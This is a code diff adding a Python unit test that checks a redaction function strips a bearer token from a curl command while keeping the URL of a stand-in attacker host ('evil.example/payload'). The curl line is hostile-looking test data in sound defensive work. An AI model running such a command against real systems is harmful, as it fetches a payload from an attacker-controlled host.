@@ -111,6 +111,18 @@ def test_redacts_full_proxy_authorization_schemes() -> None:
     assert 'safe="value"' in redacted
 
 
+def test_redacts_authorization_token_without_consuming_url_context() -> None:
+    """Authorization redaction should preserve adjacent network indicators."""
+    redacted = redact_evidence_string(
+        'curl -H "Authorization: Bearer AUTHSECRET123" https://evil.example/payload',
+        max_chars=500,
+    )
+
+    assert "AUTHSECRET123" not in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "https://evil.example/payload" in redacted
+
+
 def test_redacts_triple_quoted_key_values_atomically() -> None:
     """Triple-quoted Python credential values should be redacted as one value."""
     text = "{'api_key': '''TRIPLESECRET123''', 'safe': 'value'}"
